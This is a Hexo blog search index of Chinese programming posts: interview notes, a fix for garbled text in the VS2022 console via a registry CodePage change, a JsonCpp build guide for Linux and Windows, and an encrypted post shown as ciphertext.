<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>旁听面试2.0</title>
      <link href="/2022/12/10/%E6%97%81%E5%90%AC%E9%9D%A2%E8%AF%952-0/"/>
      <url>/2022/12/10/%E6%97%81%E5%90%AC%E9%9D%A2%E8%AF%952-0/</url>
      
        <content type="html"><![CDATA[<h1 id="继续听别人面试取取经"><a href="#继续听别人面试取取经" class="headerlink" title="继续听别人面试取取经"></a>继续听别人面试取取经</h1><span id="more"></span><hr><h1 id="创业型公司"><a href="#创业型公司" class="headerlink" title="创业型公司"></a>创业型公司</h1><h2 id="提问环节"><a href="#提问环节" class="headerlink" title="提问环节"></a>提问环节</h2><ol><li>自我介绍</li></ol><blockquote><p>这是经典问题，虽然时间不长，但是有条理比较重要</p></blockquote><p><strong>学历学校情况</strong></p><ol><li>什么时候毕业？</li><li>为什么四月就去工作？</li><li>上一份工作是什么原因溜了？</li></ol><p><strong>地方选择</strong></p><ol><li>为什么来福州找工作？</li></ol><p><strong>实际考察</strong></p><ol><li>项目方面<ol><li>第一个是做客户端还是服务端？</li><li>有哪些重构？</li></ol></li><li>什么设计<ol><li>用到了mvc设计？</li><li>mvc怎么体现？</li></ol></li><li>客户端包含什么模块<ol><li>测试、文件传输、文件下载、文件删除、屏幕监控、鼠标操作等。</li></ol></li><li>客户端使用mfc做的？但是mfc比较老了吧，为什么要用mfc？</li><li>提到了消息机制，有自定义消息吗？</li><li>tcp&#x2F;ip在这这个项目的使用场景？</li><li>有去做过一些测试对吗？功能测试是单纯手动测试吗？</li><li>另外两个项目？<ul><li>qt那边客户端是我自己写的。</li><li>音视频了解视频编码，vlc库的使用。</li></ul></li><li>一开始就接触的是第一个项目吗？一上手就是一个基本完成的项目，你要如何学习？怎么去完成重构？</li><li>第一个项目代码量多少？</li><li>花了多少时间了解？</li><li>花了多少时间重构？</li></ol><p><strong>学校方面</strong></p><ol><li>学校里有写过什么项目吗？</li><li>大学专业是？计算机应用技术专业？主要学什么语言？</li><li>学过c语言还是直接学的c++？</li><li>以后有没有考虑继续升本吗？</li></ol><p><strong>老东家</strong></p><ol><li>在上一家公司学到了什么？</li><li>上一家公司有什么代码规范吗？</li></ol><p><strong>hr谈天说地</strong></p><ol><li>你是11月初回来，在这中间有去面试过其他公司吗？是对公司不满意还是对自己以后的方向不明确？</li><li>你对我们公司有多少了解？</li><li>上一家公司是什么类型的？也是创业型吗。</li><li>来福州面试的几家公司都是什么类型的？</li><li>你现在住在哪？</li><li>你原本公司加班多吗？双休还是单休？<ul><li>hr：我们公司现在还是双休，明年后面可能就是单休了</li></ul></li><li>投了这么多家公司，你对本地薪资的定位是什么情况？<ul><li>hr:公司给多少薪资其实还是取决于你的个人能力</li></ul></li></ol><p><strong>hr主动问的</strong></p><ol><li>要向我们了解的？比如公司业务。</li><li>对机器视觉有没有兴趣，像opencv一些类似的框架？</li><li>我们企业做的不一定会像互联网上的软件，可能偏硬件、物联网方面，电机控制、plc、单片机等<ol><li>我估计应该是说没有涉及太多多线程的玩意吧，毕竟硬件这种不用实时联网交互确实不用考虑</li></ol></li><li>因为我们涉及到一些硬件，你会对硬件感兴趣吗？有什么想法？</li><li>会不会觉得硬件太难了而害怕？</li></ol><blockquote><p>出结果到时候和你交流。</p></blockquote><hr><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>创业型的公司，问技术点细节程度比较轻，面试上的几率比较大，只要你对项目掌握程度足够。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 面试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【软件】vs2022控制台乱码</title>
      <link href="/2022/11/30/vs%E4%B9%B1%E7%A0%81/"/>
      <url>/2022/11/30/vs%E4%B9%B1%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<blockquote><p>windows的根据地区选择编码一言难尽。。</p></blockquote><span id="more"></span><hr><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本文只是介绍几种情况的处理方式，仅供参考。</p><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="1-乱码介绍"><a href="#1-乱码介绍" class="headerlink" title="1.乱码介绍"></a>1.乱码介绍</h2><p>什么是乱码？粗略解释就是：</p><blockquote><p>指保存内存的编码和输出内存的编码不一致，导致出现奇奇怪怪的字符。<br>更多详细介绍自行上网冲浪。</p></blockquote><p>这点情况在windows中很常见，原因就是Windows的特色，它会根据地区默认选择你cmd&#x2F;powerhell的编码。</p><blockquote><p>打开cmd&#x2F;powershll输入 <code>chcp</code>  按下回车</p></blockquote><p>如果你地区选择的是中国，那么回显信息为<code>活动代码页：936</code>。<br>而文本格式千奇百怪，也是拿捏不住的。<br>Linux默认都是utf-8的环境，相对比较省心不用你去改什么东西控制输出。</p><p>所以默认的vscode&#x2F;vs201x的产品，或者是其他需要调用cmd&#x2F;powershell的软件，都会存在这个问题。</p><p>vs的项目默认选择Unicode，你也可以改为多字节。</p><ol><li>统一码（Unicode），也叫万国码、单一码，由统一码联盟开发，是计算机科学领域里的一项业界标准，包括字符集、编码方案等。<ul><li>Unicode中，我记得字符都占用两个字节。</li><li>随后的utf-x系列会有一定程度不同，而现在最大众的是utf-8，在utf-8中汉字占用3个字节，英文字符1个字节。</li></ul></li><li>ANSI是一种字符代码，为使计算机支持更多语言，通常使用 0x00~0x7f 范围的1 个字节来表示 1 个英文字符。超出此范围的使用0x80~0xFFFF来编码，即扩展的ASCII编码。<ul><li>ansi也就是多字节</li><li>英文字符占用1个字节，汉字占用2个字节</li></ul></li></ol><blockquote><p>注意：即便是占用大小相同，不代表存储的字符都是一模一样的顺序开始表达。</p></blockquote><hr><h2 id="2-解决方案"><a href="#2-解决方案" class="headerlink" title="2.解决方案"></a>2.解决方案</h2><h3 id="2-1-糙糙的方法"><a href="#2-1-糙糙的方法" class="headerlink" title="2.1 糙糙的方法"></a>2.1 糙糙的方法</h3><ol><li>将文本另存为gb2312&#x2F;代码页936使其与之匹配，notepad++之类的软件操作比较快。</li><li>右击控制台-属性-改为旧版控制台，这个说实在没啥用啊，现在的系统不断地更新，改为旧版也同样不是很好的办法，而且不一定奏效——pass掉</li><li>控制面板-区域-管理-更改系统区域设置-选择beta版本语言支持<ul><li>这个的问题就是，很多的老软件，他那会可能不是用utf-8创建的，会导致他们目录乱码之类的，所以也不是很好的办法。</li></ul></li></ol><hr><h3 id="2-2-关于修改注册表"><a href="#2-2-关于修改注册表" class="headerlink" title="2.2 关于修改注册表"></a>2.2 关于修改注册表</h3><p>反正只是改固定的cmd或者powershell而已不用怕啥，大不了改回来。</p><p>首先vs先下载个拓展<a href="https://marketplace.visualstudio.com/">商店</a>，不用vs自带的下载是因为很慢很慢很慢。<br>搜索<code>Force UTF-8(No BOM)</code> ，记得看下概述<code>Overview</code>有写适用于vs哪个版本，别乱来。</p><blockquote><p>BOM是签名的意思，有签名的utf-8文件的文件头存在表示信息，一眼就知道是这个格式，更容易解析吧。但是不是必需品。</p></blockquote><p><strong>双击即可安装，安装前请先关闭vs</strong></p><p>这个拓展的作用是强制以<code>utf-8 no bom</code>形式保存所有文本文件。</p><blockquote><p>如果有ANSI的需求大于utf-8，可以关闭这个拓展。<br>vs菜单栏-拓展-管理拓展-找到即可关闭或者卸载 </p></blockquote><p>然后修改下注册表。<code>win + r</code>打开运行，输入<code>regedit</code>，选择<code>是</code>&gt;</p><blockquote><p>路径为:计算机\HKEY_CURRENT_USER\Console\</p></blockquote><p>我这会发现一个问题：</p><img src="/2022/11/30/vs%E4%B9%B1%E7%A0%81/000.png" class=""><blockquote><p>vs2022的控制台可以独立控制了<br>vs2019那会还没有这个选项的，那会我是直接改了上面两个</p></blockquote><p>直接选择这个<code>CodePage</code>字段，右击选择修改，然后十进制，改为<code>65001</code>即可。</p><img src="/2022/11/30/vs%E4%B9%B1%E7%A0%81/001.png" class=""><p>这样你通过<code>FILE</code>指针读取的utf-8文件就不会有乱码了。</p><p>如果注册表里面没有vs2022这项就只能在上面两个里面新建DWORD数据了。<br>名称要保证是<code>CodePage</code>然后十进制值是<code>65001</code>，十六进制用win自带的计算器算一下都行。</p><img src="/2022/11/30/vs%E4%B9%B1%E7%A0%81/002.png" class=""><blockquote><p>ps:不过我好像忘记了，改了这个是不是只对powershell有效来着，因为vs的控制台虽然是独立的，但是还是基于cmd，vscode那些倒是可以直接选择powershell。<br>或者要自行百度一下添加cmd项的操作了。我记得之前是找到过执行脚本的，copy下来改成bat直接管理员运行。总不能自己根据这个powershell一个个建过来吧有点累的。</p></blockquote><p><strong>当然，上述操作只是说，让控制台能输出utf-8的文字，但是文本如果是936的输出就又有问题了？</strong><br><strong>所以如果你尝试将所有控制台都改成65001的话，就要确保其他的文件都得是utf-8，不能匹配就肯定就乱码</strong></p><hr><h3 id="2-3-关于软件"><a href="#2-3-关于软件" class="headerlink" title="2.3 关于软件"></a>2.3 关于软件</h3><p>先前也说过，utf-8是Unicode的拓展，utf-8表示中文需要三个字节，而unicode是万物都两个字节，ANSI是中文两字节英文一字节。</p><blockquote><p>vs中，char占用一个字节，string就是一堆的char。<br>vs中还有一种宽字节，wchar_t，占用两个字节，至少在vs这是的。 —— 那么用wchar去存储unicode类型的数据就很容易。<br>并且，vs有大量的宏，会区分多字节和Unicode的情况。</p></blockquote><p>vs有一个函数<code>WideCharToMultiByte</code>是可以处理char和wchar。可能要引用<code>windows.h</code><br>举个例子比如说字符串。有的框架或者特殊类返回的结果可能会根据你项目属性的编码而改变。即项目unicode，返回宽字节数据。<br>wchar的类型，我们输出肯定要用<code>std::wcout</code>输出。<br>但是一会cout一会wcout很麻烦，而且将来要是存储然后解析也是一个问题。</p><p>那么就会考虑说，是不是能够把这个wchar数据转成char数据。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">std::string <span class="title">toString</span><span class="params">(<span class="type">const</span> std::wstring wstr)</span> </span>&#123;</span><br><span class="line"><span class="type">int</span> len = <span class="built_in">WideCharToMultiByte</span>(CP_ACP, <span class="number">0</span>, wstr.<span class="built_in">c_str</span>(), <span class="number">-1</span>, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">std::string ret;</span><br><span class="line"><span class="keyword">if</span> (len &lt;= <span class="number">0</span>)<span class="keyword">return</span> ret;</span><br><span class="line">ret.<span class="built_in">resize</span>(len);</span><br><span class="line"><span class="built_in">WideCharToMultiByte</span>(CP_ACP, <span class="number">0</span>, wstr.<span class="built_in">c_str</span>(), <span class="number">-1</span>, (<span class="type">char</span>*)ret.<span class="built_in">c_str</span>(), len, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数的返回值是字符串的长度，第一次不转换但是变相的读取出宽字节字符串的长度，给后面resize做准备。<br>第二次转换之后，就可以正常return了。</p><p>这个概念其实会很抽象，等到将来用的多了就通透了。</p><hr><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>救赎之道就在其中。<br>会用就好，因为生活充满变数。</p>]]></content>
      
      
      <categories>
          
          <category> software </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>JsonCpp编译使用</title>
      <link href="/2022/11/29/jsoncpp%E7%BC%96%E8%AF%91%E4%BD%BF%E7%94%A8/"/>
      <url>/2022/11/29/jsoncpp%E7%BC%96%E8%AF%91%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>这一类的开源项目是能找到已经编译好的产物，但是总归还得自己试下。</p><span id="more"></span><hr><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>JSON（JavaScript Object Notation, JS对象简谱）是一种轻量级的数据交换格式。它基于 ECMAScript（European Computer Manufacturers Association, 欧洲计算机协会制定的js规范）的一个子集，采用完全独立于编程语言的文本格式来存储和表示数据。简洁和清晰的层次结构使得 JSON 成为理想的数据交换语言。 易于人阅读和编写，同时也易于机器解析和生成，并有效地提升网络传输效率。</p><p>json这种格式对于近几年一点都不陌生。与之相匹的就是Xml了。<br>一个是建议的语法，一个是标签形式。都比较容易上手。</p><p>当然json不局限编程语言，而且各家都有做优化。<br>比如cpp中<a href="https://github.com/open-source-parsers/jsoncpp">jsoncpp</a></p><p>使用 <code>jsoncpp</code> 库解析 <code>json</code> 格式的数据，我们只需要掌握三个类：</p><ol><li>Value 类：将 json 支持的数据类型进行了包装，最终得到一个 Value 类型</li><li>FastWriter类：将 Value 对象中的数据序列化为字符串</li><li>Reader类：反序列化，将 json 字符串 解析成 Value 类型</li></ol><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>jsoncpp是支持跨平台的c++开源库。通过git之后，我们可以在本地编译成动态库或者静态库，这对于使用和部署的角度都会更加的方便。</p><hr><h2 id="1-Linux"><a href="#1-Linux" class="headerlink" title="1.Linux"></a>1.Linux</h2><p>不过好像网上有不同版本的，比如windows我用的就是github搜到的star最多的那个，按照说法这个是比较新的，使用cmake但是编译过程比较麻烦。大概是0.10.x的版本</p><p>还有个0.5.0的老版本<a href="https://sourceforge.net/projects/jsoncpp/files/latest/download">下载地址</a></p><blockquote><p>温馨提示：科学上网</p></blockquote><p>下过来之后通过xshell或者windterm直接传过去<br>等待下载过来给他解压了<br><code>tar zxvf jsoncpp-src-0.5.0.tar.gz</code><br>解压完成后切换目录。</p><img src="/2022/11/29/jsoncpp%E7%BC%96%E8%AF%91%E4%BD%BF%E7%94%A8/002.png" class=""><p>原本我以为要用cmake的<br><code>sudo apt install cmake</code><br>但是这个版本好像大家都在用<code>scons</code>自动构建。<br><code>sudo apt install scons</code><br>下个试试好了</p><p>使用scons之前需要指定gcc。<br>我们在解压出来的jsoncpp目录下：<br><code>scons platform=linux-gcc</code>，也有可能是下面几种，前提是环境得有</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Invoke SCons as follows:</span><br><span class="line"></span><br><span class="line">scons platform=$PLATFORM [TARGET]</span><br><span class="line">where $PLATFORM may be one of:</span><br><span class="line"></span><br><span class="line">suncc: Sun C++ (Solaris)</span><br><span class="line">vacpp: Visual Age C++ (AIX)</span><br><span class="line">mingw</span><br><span class="line">msvc6: Microsoft Visual Studio 6 service pack 5-6</span><br><span class="line">msvc70: Microsoft Visual Studio 2002</span><br><span class="line">msvc71: Microsoft Visual Studio 2003</span><br><span class="line">msvc80: Microsoft Visual Studio 2005</span><br><span class="line">msvc90: Microsoft Visual Studio 2008</span><br><span class="line">linux-gcc: Gnu C++ (linux, also reported to work for Mac OS X)</span><br></pre></td></tr></table></figure><p>待执行完毕之后</p><img src="/2022/11/29/jsoncpp%E7%BC%96%E8%AF%91%E4%BD%BF%E7%94%A8/003.png" class=""><p>切换到libs目录下的linux-gcc(版本)目录下会看到一个.a和.so的文件</p><blockquote><p>.a属于linux的静态链接库，跟windows下的.lib一个道理<br>.so属于linux的动态链接库，跟Windows下的.dll一个道理</p></blockquote><img src="/2022/11/29/jsoncpp%E7%BC%96%E8%AF%91%E4%BD%BF%E7%94%A8/004.png" class=""><p>头文件按照这个路径找：</p><img src="/2022/11/29/jsoncpp%E7%BC%96%E8%AF%91%E4%BD%BF%E7%94%A8/005.png" class=""><blockquote><p>使用jsoncpp就是要注意上面提到过的三个类：Value、Reader和Writer</p></blockquote><p>自己新建个文件夹，然后新建个json</p><img src="/2022/11/29/jsoncpp%E7%BC%96%E8%AF%91%E4%BD%BF%E7%94%A8/006.png" class=""><p>但是注意，要把include和libs还有个src都copy过来。<br><code>cp -r</code>，因为不是单个目录，要递归复制过来。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;json/json.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">        std::ifstream is;</span><br><span class="line">        is.<span class="built_in">open</span>(<span class="string">&quot;test.json&quot;</span>, std::ios::binary);</span><br><span class="line"></span><br><span class="line">        Json::Reader reader;</span><br><span class="line">        Json::Value root;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(reader.<span class="built_in">parse</span>(is, root))&#123;</span><br><span class="line">                <span class="keyword">auto</span> members = root.<span class="built_in">getMemberNames</span>();</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">unsigned</span> i = <span class="number">0</span>; i &lt; members.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">                        std::cout &lt;&lt; members[i] &lt;&lt; <span class="string">&quot;==&gt;&quot;</span> &lt;&lt; root[members[i]].<span class="built_in">toStyledString</span>() &lt;&lt; std::endl;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>g++编译，这里注意因为我们源文件include的时候没有完全用相对路径，所以可以指明json.h从哪个目录里找，然后就是关联静态库生成二进制文件<br><code>g++ jstest.cpp -I ./include/  -o libjs ./libs/linux-gcc-7/libjson_linux-gcc-7_libmt.a</code></p><img src="/2022/11/29/jsoncpp%E7%BC%96%E8%AF%91%E4%BD%BF%E7%94%A8/007.png" class=""><p>就可以解析json文件内容了。</p><blockquote><p>当然读取的方式可以有很多，此处我是根据一个key往下走，没了再看下一个key如此反复循环，</p></blockquote><p>然后试试看新版本的cmake，要是太麻烦就拉倒哈哈。</p><img src="/2022/11/29/jsoncpp%E7%BC%96%E8%AF%91%E4%BD%BF%E7%94%A8/008.png" class=""><blockquote><p>原来tags有分版本，额确实是github不熟练了。<br>0.5还去别的网站下，直接从这里wget就好了</p></blockquote><p>直接wget获取<br><code>wget https://github.com/open-source-parsers/jsoncpp/archive/0.10.5.zip</code><br>然后解压<br><code>unzip 0.10.5.zip</code></p><img src="/2022/11/29/jsoncpp%E7%BC%96%E8%AF%91%E4%BD%BF%E7%94%A8/009.png" class=""><blockquote><p>在编译的时候有个问题需要注意，那就是0.10.x系列都是五六年，七八年前的产品，而现在的ubuntu18起，gcc、cmake的版本和标准只会越来越高。</p></blockquote><p><strong>卒，解决不来，百度半天也没有合适的解答，0.10.5 or 0.10.6 make的时候均报错，都是智能指针和某些问题导致</strong></p><p>但是相反的，scons则可以构建虽然也能看到几个问题，但是最终还是能生成库文件。这令我不解？</p><img src="/2022/11/29/jsoncpp%E7%BC%96%E8%AF%91%E4%BD%BF%E7%94%A8/010.png" class=""><blockquote><p>TODO: 若是以后有遇到回头再补充。</p></blockquote><p>同时linux编译最新版的jsoncpp，好像cmake版本也不够。</p><blockquote><p>cmake –verison<br>我的ubuntu18是3.10.2版本</p></blockquote><p>参考这个文章下个高版本的吧。<a href="https://blog.csdn.net/weixin_43779943/article/details/98485254">文章地址</a></p><img src="/2022/11/29/jsoncpp%E7%BC%96%E8%AF%91%E4%BD%BF%E7%94%A8/021.png" class=""><p><a href="https://blog.csdn.net/weixin_44290011/article/details/109120478">参照文章</a></p><blockquote><p>注意这篇文章是20年发布的，版本是1.9.4<br>你通过上文改的cmake版本只适用于此。不适用于22年的最新版本，我试过了。</p></blockquote><p><code>wget https://github.com/open-source-parsers/jsoncpp/archive/1.9.4.zip</code><br>然后剩余步骤跟参考文章来就行</p><img src="/2022/11/29/jsoncpp%E7%BC%96%E8%AF%91%E4%BD%BF%E7%94%A8/022.png" class=""><p>能看到cmake确实没报错。<br>然后make执行完之后，lib文件也生成了。</p><img src="/2022/11/29/jsoncpp%E7%BC%96%E8%AF%91%E4%BD%BF%E7%94%A8/023.png" class=""><blockquote><p>结论就是。。。其实并不麻烦，就是要选对cmake版本？<br>有一定道理，因为我windows编译的时候cmake下的就是最新的，然后也是编译的最新版本。</p></blockquote><hr><h2 id="2-windows"><a href="#2-windows" class="headerlink" title="2.windows"></a>2.windows</h2><p><del>README.md有教你用vcpkg的方式去下载安装：</del><br>先不管这个，搞cmake好了。</p><p>安装cmake</p><blockquote><p><a href="https://cmake.org/download/">https://cmake.org/download/</a></p></blockquote><p>windows总得认识吧哈哈，msi和zip应该问题不大。<br>直接用msi安装了</p><p>打开cmake-gui，也就是图形化的意思</p><img src="/2022/11/29/jsoncpp%E7%BC%96%E8%AF%91%E4%BD%BF%E7%94%A8/011.png" class=""><p>然后注意git clone下jsoncpp，或者在github上下载zip压缩包解压也一样。</p><img src="/2022/11/29/jsoncpp%E7%BC%96%E8%AF%91%E4%BD%BF%E7%94%A8/014.png" class=""><p>然后指定下git过来的文件和要输出到哪个文件夹</p><img src="/2022/11/29/jsoncpp%E7%BC%96%E8%AF%91%E4%BD%BF%E7%94%A8/012.png" class=""><p>根据编译器选择版本，有x86需求第二栏就填上，没有默认为x64。单选按钮就默认的。</p><img src="/2022/11/29/jsoncpp%E7%BC%96%E8%AF%91%E4%BD%BF%E7%94%A8/013.png" class=""><p>选择正确的话他会开始跑一段不用管，然后点击Generate</p><img src="/2022/11/29/jsoncpp%E7%BC%96%E8%AF%91%E4%BD%BF%E7%94%A8/015.png" class=""><p>等待done之后，打开输出目录，找到<code>.sln</code>就是vs的项目文件打开</p><img src="/2022/11/29/jsoncpp%E7%BC%96%E8%AF%91%E4%BD%BF%E7%94%A8/016.png" class=""><p>右击这个项目设为启动项，然后点击菜单栏中的生成。</p><img src="/2022/11/29/jsoncpp%E7%BC%96%E8%AF%91%E4%BD%BF%E7%94%A8/017.png" class=""><p>看到这么一段话就算ok了。</p><img src="/2022/11/29/jsoncpp%E7%BC%96%E8%AF%91%E4%BD%BF%E7%94%A8/018.png" class=""><blockquote><p>最后根据提示的两个路径下分别能找到lib和dll文件<br>你只需要带走clone过来的目录下有个include头文件夹里面的json文件夹和这俩其中一个，给其他项目属性改下就能用了。</p></blockquote><img src="/2022/11/29/jsoncpp%E7%BC%96%E8%AF%91%E4%BD%BF%E7%94%A8/019.png" class=""><img src="/2022/11/29/jsoncpp%E7%BC%96%E8%AF%91%E4%BD%BF%E7%94%A8/020.png" class=""><hr><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>害，编译最主要是环境问题，软件的版本，下载的文件版本，不适配是很难编译出来的。<br>所以找现场的也没有太大毛病。</p>]]></content>
      
      
      <categories>
          
          <category> 开源项目 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>易栈</title>
      <link href="/2022/11/28/%E6%98%93%E6%A0%88/"/>
      <url>/2022/11/28/%E6%98%93%E6%A0%88/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="38a563fd448bdcb3c9b2151781bee9fdd1945af3b39ecbeb4c8391ef4813eaf7">2c4b4b8d9c4e11191fdaac99b8ca2a8bb7914512d1bc9d5e785dac70feb4d01b0225d6b149090cacea514a5f9560019cc5e3c668fd957dd05293c9afe294a63d3eed9b800453985b71be3ad26ed36e57eab83140c2ea7a45059a0fb05f29b6ef306a589d17eb9d2db48307187973c92071104c97ab60fc890edab61485642c1c3cf2508baacf9bdbe96a9f02a7e3b25a549625632e2870c4f71de2344e21a86b99f2c91b660eebb8592bc79072cc716d33ec81c0f03bcde72ac8eeae3d66b8f1610e4b28e6e01341a7377c736b458fed0177588474203f5da865767b4c286b4651f5a532ceafe64ae5e77ec7eb337dbb50be1e8fd49cb02bcb5304d2b1702577a8d1c4e44420a2c45c7b81dab9b7ccb195dd2d0b1947831047a8adf06aff5932abd33a74a08dc452bb74b1e900f8c6f61642dd60c45a66f7d9f943c9cc89c6ceb816cfa217f02b47a85c3b8ea1e5b76b627a097c383acd56cc984a6afe5eaf60f12c42ef8fb513e3237771591c702c6a21eba9f96572b010901823cee0715cc25adb517bf40c36ee478afc5c3c2f54ca121103dd6c2132ad49941c423a0cd8838277b347253578fa50b18ef5e1917d2a563dd288a0f17f65f94372e426214d8f477a4d8e6d74af9adc328648ba58cc40384e7bc4f682729f86ff6118921752a5abf4ae654264ffe2794ad3c3b75355123fd5563a4a145813cd477f8bee647d98d60fe4c01510a44764d32d4043a6575a19a579cc5ad7e72f42bafc89e795ad8256198c12b57e68baaa4caf7b01d6f812658ec95d02ae58cf0dcef37cad799f37bb210846cc745be5fbe4f6039f8ede67f02a07d1343cfbb471a5c43bbca423dc988b6fbc840da92e4687eea04f7443818676909248bf945237db261dc55d5171ede2135861e34cd9d5320b1e4a0413d3763bd411f15b0f51e3b02e39c5243918c03c087f512f4e602ef868d9f9bdd61c2cbde0c1f6507d171ae79a030adef17fdf3887e596903ac9c886c595e19f28b3b03990c1d72b4ff84abcbb9fe5aa0d17e580ac5bd34361d9b40a793c35141c148583be6e9928036b8de9eeecc78ebb10c4c6b1871897d68d0ac6384fc04f5a3dc3d2fa418c3c759e1e8cba070f951f709fa7e456c5dc3e543a3bd54fe7e276243dac67551e944f0bac68c3331cecbbc8df84ad23d73acf3e3c31010f318f08f85219bba27b7c66230bc1adc167035b2c67aa68677d4bfc1a4f0ce4df2abb8515d3039847af13afc1ea7c9e6ac985f83ddd8bd8039eb3eb7306b76ca1db8359e7e6fcbb4aac11d314e359bc82637ac48553ac5e52e387758c3cf916283c1369c6153b71068da8a3c61ee0b28cdb57077f5d9e85e0c5ec82fa4ecc0ab39b6be0df88356a6569c9d16b7b1894df8b35f6b8492bbdfdf733ce6ff2356009bb01b024a9926adb524d0e052e5403c4c880f88721ee8cdd79a3f92326d99ddc03cb16af6303aa894311c26ca34b509e95aa347262a7cb9c2086beec80b39a3e892b795d40a0e4854369df1f9ca72963f49c6d67eff7848a01c80cb748033e43a7411b84b6950600e214be6b40032310bf2eab835c5edfda95a0a2f5590ca4cf992caf6b2faed8234def205592fc432923f9d4c92b9dddc6c651d805e32db46828868d2ca206291a765b58044c613a37d656676702ed8003720939ff11b44e50cb672a3dde547c4b4f79ee4908bc4ccb81491b2e64eb4fff3936c50650b32f942124c1383bffc6103447ab2e77d656a920a9fe6d7f36e0a4cc2b3ef2a1ee2219b167414c7bdaba7f98e1d7e68995031df64fc529b238b8e6ddf1d4c4a0740c163be1e0bf6acfe2e3248e8daa90942393a65c6fe67919a2ae4e162f855bdea6742a0912017e083f99b55056d5d5713f311a4b37f8be8f04229476c4b26423b72fca65d076e4f5cf5d9b6822dda3c87f790a8911fb5de4aaf18efbb2f9329632c900c50c4b52fa480566304d0c00952bc7aefed3613c3c2674885f47e86277e619f79d56659707ba6ae1aa51da681d1c0a5f0727be3bef4acbde9027f9b6e8078a9cef6e8ff5d3cd6c41c7457bdf8434105e64d3206d5cde537ea15e2b91808b6b40a5d0ad0a26781e1caf4c8b789a43c85086c25bd80cafe31a64cde0cc928cb108d7e863ca221b2ff4b90eaddcd3ae3862d3b1c95b37813e90f5f825213f697434a70f2d3f853470f7c552ac1752473341a0811cf045b7503363a1febead6b13d82a001c89c3507ec6b876c69cff636de8ca9d01cd10719dce442703e8844cc57e2fb71f5c56d9eebbd0b201dd675926abd4de041d818fa0407845d2381fb2ca95271967cf9f90ce1b573ba1070b332f4e6ac5a81efec91395257478d450ece85f88919d6597bbdd0179c371aaa222c20ddfddffc34d5cdbbb4c93b7faa7a88354ca53e036495576c6a2bd02a13b016e22897f4dcd9bbed408d00979dee7eeb4bab4ff15c759540fa2a127db768a7f27a6931b73a83adb45283f3a3246c0ab209a1fd860b8f67fbf140613efd60e9e1c2533122454b5900e1bb8cf2803990be09352a8810a14d6b954969f8d470378738df2b9017bd5d26f831906e6a3f447203429df9fe049f440256fbac1e79ef864883832bc1585dcc288049c2e599908b0cac2fa628a0d75685e8a75a41e0cf407799222ee3a32a403ec2611ef3135044d3664eca0c8d74a0718e465989fdf20ef0f70240066716a6350404eb0f59b7bc0afadc0f77631e83b92cef70e8d5040f4b968d07223796cf22543918c28034a0bb345dd90ccceb82db88d858944abd7ca4726a9f712eb8593265fb968537f34a4f1b863f48b01c97a5970ace79f46683ebdaf67fb3a7491c19b56f02db8938e9804a9cc429edb5b84946bcd812283033e0dee7fddf22bd56f30312f12cba7c107e7e94daa8bedc1d5005f44cfcb542736ee6b05eb67c49d7a3a2935898e8e2199a4f6937387df580843ac21d56ab1ad7d396e16b795972a86a9517a1c5a20d2df00f11ec293e65c8c17df7eb8bb660a267606f0f9528cb4e94e90bc65b312f870b05be3b376a39ddeb85bc229de5